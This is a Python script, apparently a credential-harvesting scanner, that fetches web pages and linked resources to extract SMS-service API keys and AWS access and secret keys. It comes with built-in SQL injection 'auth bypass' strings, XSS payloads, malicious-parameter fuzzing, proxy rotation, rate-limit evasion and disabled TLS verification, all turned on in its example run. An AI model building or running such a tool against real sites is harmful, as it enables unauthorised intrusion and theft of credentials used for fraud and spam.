import re
import requests
from urllib.parse import urlparse, urljoin, urlencode, parse_qsl
import random
import time
from bs4 import BeautifulSoup

def load_proxies(proxy_file="proxies.txt"):
    """
    Loads proxies from a text file, one proxy per line.
    """
    try:
        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def scan_for_sms_apis(text):
    """
    Scans text for potential SMS API keys and endpoints with advanced patterns.
    """
    patterns = {
        "Twilio": [
            r"(AC[a-zA-Z0-9]{32})",  # Twilio Account SID
            r"(twilio\.com/sms/v[0-9]+)", # Twilio API Endpoint
            r"(api\.twilio\.com)", # Twilio API Endpoint
        ],
        "Textbelt": [
            r"(textbelt\.com/text)", # Textbelt API Endpoint
        ],
        "AWS SNS": [
            r"(arn:aws:sns:[\w-]+:\d+:[\w-]+)",  # AWS SNS ARN
            r"(amazonaws\.com/sns)", # AWS SNS Endpoint
            r"(AKIA[0-9A-Z]{16})", # AWS Access Key ID
            r"(secret_key=[\w+/]{40})", # AWS Secret Key (Base64 encoded)
        ],
        "Nexmo": [
            r"(nexmo\.com/sms/json)", # Nexmo API Endpoint
            r"(key=[a-zA-Z0-9]{32})", # Nexmo API Key
            r"(api\.nexmo\.com)", # Nexmo API Endpoint
        ],
        "Plivo": [
            r"(plivo\.com/v[0-9]+/Account)", # Plivo API Endpoint
            r"(auth_id=[a-zA-Z0-9]{32})", # Plivo Auth ID
            r"(api\.plivo\.com)", # Plivo API Endpoint
        ],
        "MessageBird": [
            r"(messagebird\.com/api/sms)", # MessageBird API Endpoint
            r"(access_key=[a-zA-Z0-9]{32})", # MessageBird Access Key
            r"(messagebird\.com/api)", # MessageBird API Endpoint
        ],
        "Infobip": [
            r"(infobip\.com/sms)", # Infobip API Endpoint
            r"(apiKey=[a-zA-Z0-9-]+)", # Infobip API Key
            r"(api\.infobip\.com)", # Infobip API Endpoint
        ],
        "Vonage": [
            r"(api\.vonage\.com)",  # Vonage API Endpoint
            r"(vonage\.com/sms)",  # Vonage SMS Endpoint
            r"(NX-[A-Z0-9]{32})",  # Vonage API Key
        ],
        "TeleSign": [
            r"(telesign\.com/sms)", # TeleSign API Endpoint
            r"(customerId=[a-zA-Z0-9-]+)", # TeleSign Customer ID
            r"(apiKey=[a-zA-Z0-9-]+)", # TeleSign API Key
            r"(api\.telesign\.com)", # TeleSign API Endpoint
        ],
    }

    found = {}
    for service, regexes in patterns.items():
        found[service] = []
        for regex in regexes:
            matches = re.findall(regex, text, re.IGNORECASE)  # Case-insensitive search
            if matches:
                found[service].extend(matches)

    return found

def scan_url(url, use_proxies=False, deep_scan=False, proxy_file="proxies.txt", fuzzing=False, auth_bypass=False, data_injection=False, rate_limit_evasion=False, error_analysis=False):
    """
    Fetches content from a URL and scans it for SMS API keys.
    Includes proxy support, deep scanning, and security bypassing techniques.
    """
    proxies = load_proxies(proxy_file)
    if not proxies:
        print("No proxies loaded. Continuing without proxies.")
        use_proxies = False

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Referer": "https://www.google.com/",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
    }

    try:
        if use_proxies:
            proxy = random.choice(proxies)
            print(f"Using proxy: {proxy}")
            proxy_dict = {"http": proxy, "https": proxy}
        else:
            proxy_dict = None

        session = requests.Session()  # Use a session for persistent connections
        session.headers.update(headers)

        if rate_limit_evasion:
            time.sleep(random.uniform(0.5, 2))  # Random delay to avoid rate limiting

        response = session.get(url, proxies=proxy_dict, timeout=10, verify=False)
        response.raise_for_status()
        content = response.text

        # Error Message Analysis
        if error_analysis:
            if "error" in content.lower() or "exception" in content.lower():
                print(f"Potential error message found on {url}: {content[:200]}...")

        # Deep Scan: Follow redirects and scan linked resources
        if deep_scan:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            urls = re.findall(r'href=["\'](https?://[^"\']+)["\']', content, re.IGNORECASE)
            urls.extend(re.findall(r'src=["\'](https?://[^"\']+)["\']', content, re.IGNORECASE))

            for linked_url in urls:
                if not urlparse(linked_url).netloc:
                    linked_url = urljoin(base_url, linked_url)

                try:
                    if rate_limit_evasion:
                        time.sleep(random.uniform(0.5, 2))
                    linked_response = session.get(linked_url, proxies=proxy_dict, timeout=5, verify=False)
                    linked_response.raise_for_status()
                    content += linked_response.text
                except requests.exceptions.RequestException as e:
                    print(f"Error fetching linked URL {linked_url}: {e}")

        # Automated Parameter Fuzzing
        if fuzzing:
            fuzzable_params = extract_fuzzable_parameters(url, content)
            for param, value in fuzzable_params.items():
                fuzzed_value = fuzz_parameter(value)
                fuzzed_url = replace_parameter(url, param, fuzzed_value)

                try:
                    if rate_limit_evasion:
                        time.sleep(random.uniform(0.5, 2))
                    fuzzed_response = session.get(fuzzed_url, proxies=proxy_dict, timeout=5, verify=False)
                    fuzzed_response.raise_for_status()
                    fuzzed_content = fuzzed_response.text
                    content += fuzzed_content  # Add fuzzed content for scanning
                    print(f"Fuzzed {param} with {fuzzed_value} on {fuzzed_url}")
                    if error_analysis:
                        if "error" in fuzzed_content.lower() or "exception" in fuzzed_content.lower():
                            print(f"Potential error message found on fuzzed URL {fuzzed_url}: {fuzzed_content[:200]}...")

                except requests.exceptions.RequestException as e:
                    print(f"Error fetching fuzzed URL {fuzzed_url}: {e}")

        # Authentication Bypass Testing (Basic - needs more advanced techniques)
        if auth_bypass:
            bypass_attempts = ["' OR '1'='1", "admin'--", "'' OR 1=1--"]
            for attempt in bypass_attempts:
                bypassed_url = url + attempt  # Simple URL appending - needs improvement
                try:
                    if rate_limit_evasion:
                        time.sleep(random.uniform(0.5, 2))
                    bypassed_response = session.get(bypassed_url, proxies=proxy_dict, timeout=5, verify=False)
                    bypassed_response.raise_for_status()
                    bypassed_content = bypassed_response.text
                    content += bypassed_content
                    print(f"Auth Bypass attempt: {bypassed_url}")
                    if error_analysis:
                        if "error" in bypassed_content.lower() or "exception" in bypassed_content.lower():
                            print(f"Potential error message found on auth bypass URL {bypassed_url}: {bypassed_content[:200]}...")

                except requests.exceptions.RequestException as e:
                    print(f"Error fetching auth bypass URL {bypassed_url}: {e}")

        # Data Injection Detection (Basic - needs more sophisticated payloads)
        if data_injection:
            injection_payloads = ["<script>alert('XSS')</script>", "\"><img src=x onerror=alert('XSS')>"]
            for payload in injection_payloads:
                injected_url = url + "?injection=" + payload  # Simple URL appending
                try:
                    if rate_limit_evasion:
                        time.sleep(random.uniform(0.5, 2))
                    injected_response = session.get(injected_url, proxies=proxy_dict, timeout=5, verify=False)
                    injected_response.raise_for_status()
                    injected_content = injected_response.text
                    content += injected_content
                    print(f"Data Injection attempt: {injected_url}")
                    if error_analysis:
                        if "error" in injected_content.lower() or "exception" in injected_content.lower():
                            print(f"Potential error message found on data injection URL {injected_url}: {injected_content[:200]}...")

                except requests.exceptions.RequestException as e:
                    print(f"Error fetching data injection URL {injected_url}: {e}")

        results = scan_for_sms_apis(content)
        return results

    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return {}

def extract_fuzzable_parameters(url, content):
    """
    Extracts potential fuzzable parameters from a URL and its content.
    This is a basic implementation and can be improved.
    """
    params = {}
    parsed_url = urlparse(url)
    query_params = parsed_url.query
    if query_params:
        for item in query_params.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                params[key] = value

    # Extract parameters from forms (very basic)
    soup = BeautifulSoup(content, 'html.parser')
    for form in soup.find_all('form'):
        for input_field in form.find_all('input'):
            name = input_field.get('name')
            value = input_field.get('value', '')
            if name and name not in params:
                params[name] = value
    return params

def fuzz_parameter(value):
    """
    Fuzzes a parameter value with potentially malicious input.
    This is a basic implementation and should be expanded.
    """
    fuzz_payloads = ["'\"", "<>\"", "12345", "test", "%20", "%27", "%3C", "%3E"]
    return random.choice(fuzz_payloads)

def replace_parameter(url, param, value):
    """
    Replaces a parameter value in a URL.
    """
    parsed_url = urlparse(url)
    query_params = dict(parse_qsl(parsed_url.query))
    query_params[param] = value
    new_query = urlencode(query_params)
    return parsed_url._replace(query=new_query).geturl()

if __name__ == "__main__":
    # Example Usage:
    text_to_scan = """
    This is some example text with a Twilio Account SID: ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    And a Textbelt endpoint: textbelt.com/text
    Also, an AWS Access Key: AKIAXXXXXXXXXXXXXXXX and a Secret Key: secret_key=ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/
    And a TeleSign Customer ID: customerId=1234567890abcdef and API Key: apiKey=fedcba0987654321
    """

    url_to_scan = "http://example.com?param1=value1&param2=value2" # Replace with a URL you want to scan

    # Scan text directly
    results_text = scan_for_sms_apis(text_to_scan)
    print("Results from text scan:", results_text)

    # Scan a URL with advanced features
    use_proxies = False  # Changed to False by default if no proxies exist
    deep_scan = True  # Set to True for deep scanning
    proxy_file = "proxies.txt"  # Path to your proxy list
    fuzzing = True  # Enable automated parameter fuzzing
    auth_bypass = True  # Enable authentication bypass testing
    data_injection = True  # Enable data injection detection
    rate_limit_evasion = True  # Enable rate limit evasion
    error_analysis = True # Enable error message analysis

    results_url = scan_url(
        url_to_scan,
        use_proxies=use_proxies,
        deep_scan=deep_scan,
        proxy_file=proxy_file,
        fuzzing=fuzzing,
        auth_bypass=auth_bypass,
        data_injection=data_injection,
        rate_limit_evasion=rate_limit_evasion,
        error_analysis=error_analysis
    )
    print("Results from URL scan:", results_url)
